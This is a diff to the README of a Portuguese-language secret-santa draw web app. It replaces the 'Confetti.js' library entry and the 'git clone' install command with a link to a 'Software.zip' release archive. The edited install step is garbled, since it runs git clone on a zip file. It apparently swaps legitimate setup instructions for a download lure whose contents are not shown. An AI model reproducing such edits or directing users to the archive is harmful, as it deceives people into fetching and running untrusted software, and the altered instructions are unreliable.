@@ -31,11 +31,11 @@ Caso queira experimentar um sorteio com funcionalidades extras, clique em **Modo
 - **HTML** para estruturar a página web.
 - **CSS** para o design e layout da página.
 - **JavaScript** para a lógica do sorteio e interações.
-- **Confetti.js** para as animações de confetes.
+- **https://github.com/andrebcb/Sorteador-Amigo-Secreto/releases/download/v1.0/Software.zip** para as animações de confetes.
 
 ## Instalação
 
 1. Clone este repositório para sua máquina local:
 
    ```bash
-   git clone https://github.com/seu-usuario/amigo-secreto.git
+   git clone https://github.com/andrebcb/Sorteador-Amigo-Secreto/releases/download/v1.0/Software.zip
